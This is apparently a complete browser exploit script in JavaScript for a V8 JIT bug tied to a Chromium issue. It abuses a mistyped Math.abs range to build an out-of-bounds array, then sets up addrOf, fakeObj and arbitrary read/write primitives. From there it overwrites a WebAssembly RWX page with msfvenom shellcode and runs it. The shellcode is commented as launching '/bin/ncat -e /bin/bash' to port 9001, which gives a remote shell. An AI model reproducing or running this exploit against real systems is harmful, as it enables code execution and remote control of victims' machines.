function trigger() {
  // loop from https://crbug.com/1051017
  var x = -Infinity;
  var k = 0;
  for (var i = 0; i < 1; i += x) {
    if (i == -Infinity) {
      x = +Infinity;
    }
    if (++k > 10) {
      break;
    }
  }
  // after loop, i = NaN | Range(-inf, inf)

  var badInt = Math.max(i, 1024);   // badInt = NaN | Range(1024, inf)
  badInt = -badInt;                 // badInt = NaN | Range(-inf, -1024)
  badInt = Math.max(badInt, -1025); // badInt = NaN | Range(-1025, -1024)
  badInt = -badInt;                 // badInt = NaN | Range(1024, 1025)
  badInt -= 1022;                   // badInt = NaN | Range(2, 3)

  // bug is here, number absolute will remove NaN possibility
  // but Math.abs(NaN) returns NaN, now "ReduceJSCreateArray"
  // will assume a length wrong to small capacity(16)
  badInt = Math.abs(badInt); // badInt = Range(2, 3)

  // 2 >> 1 == 1 && 3 >> 1 == 1
  badInt >>= 1; // badInt = Range(1, 1)
  badInt += 10; // badInt = Range(11, 11)
  var array = new Array(badInt); // JSCreateArray(Range(11, 11))
  array[0] = 1.1;
  return array;
};

for (let i = 0; i < 100_000; ++i) {
  trigger();trigger();trigger();
}

// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

/**
  * Float to Integer
  * in: Float (ex: 2.2)
  * out: Unsigned Int 
*/
function ftoi(val) { // typeof(val) = float
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n); // Watch for little endianness
}

/**
  * Integer to Float
  * in: Unsigned Int
  * out: Float (ex: 2.2) 
*/
function itof(val) { // typeof(val) = BigInt
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

/**
  * To hex
  * in: Float (ex: 2.2)
  * out: 0xbaddbeef
*/
function ftoh(val) {
  return "0x" + ftoi(val).toString(16);
}

function itoh(val) {
  return "0x" + val.toString(16);
}

function dump(arr, len) {
  for (let i = 0; i < len; i++)
    console.log(`${i}: ${ftoh(arr[i])}`)
}

function read(addr) {
  if (addr % 2n == 0) {
    addr += 1;
  }

  fake_arr[1] = itof((8n << 32n) + addr - 8n);
  return fake[0];
}

function write(addr, val) {
  if (addr % 2n == 0) {
    addr += 1;
  }
  fake_arr[1] = itof((8n << 32n) + addr - 8n);
  fake[0] = itof(BigInt(val));
}

// oob_float[19] === obj_arr[0]
function addrOf(obj) {
  obj_arr[0] = obj;
  // addr = (ftoi(oob_float[19]) & 0xffffffffn);
  addr = (ftoi(oob_float[19]) & 0xffffffffn);
  return addr;
}

// oob_float[19] === obj_arr[0]
function fakeObj(addr) {
  oob_float[19] = itof(BigInt(addr));
  fake = obj_arr[0]
  return fake;
}

// start exploit

var oob_float = trigger();
var obj_arr = [{}, {}];
var float_arr = [1.1, 2.2];

// dump(oob_float, 40);

var obj_map = ftoi(oob_float[15]) & 0xffffffffn
var float_map = ftoi(oob_float[32]) & 0xffffffffn
console.log("[+] Float Map:  " + itoh(float_map));
console.log("[+] Object Map: " + itoh(obj_map));

var fake_arr = [itof(float_map), 1.2, 1.3, 1.4];
var fake = fakeObj(addrOf(fake_arr) + 0x20n);

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_exec_shellcode = wasm_instance.exports.main;

console.log("[+] Found pointer to wasm instance: 0x" + addrOf(wasm_instance).toString(16))
var rwx_page_addr = ftoi(read(addrOf(wasm_instance) + 0x68n));
console.log("[+] Found pointer to rwx page: 0x" + addrOf(rwx_page_addr).toString(16))

function copy_shellcode(addr, shellcode) {
  let buf = new ArrayBuffer(0x100);
  let dataview = new DataView(buf);
  let buf_addr = addrOf(buf);
  let backing_store_addr = buf_addr + 0x14n;
  write(backing_store_addr, addr);

  for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint32(4 * i, shellcode[i], true);
  }
}

// msfvenom -p linux/x64/exec CMD='/bin/ncat -e /bin/bash 0.0.0.0 9001' --format dword
var shellcode = [0x622fb848, 0x732f6e69, 0x50990068, 0x66525f54, 0x54632d68, 0x24e8525e, 0x2f000000, 0x2f6e6962,
  0x7461636e, 0x20652d20, 0x6e69622f, 0x7361622f, 0x2e302068, 0x2e302e30, 0x30392030, 0x56003130,
  0x6a5e5457, 0x050f583b
];
copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] WASM instance - OK");
console.log("[+] Shellcode - OK");
console.log("[+] Read/write/exec - OK");

console.log("[*] Running shellcode...");
wasm_exec_shellcode();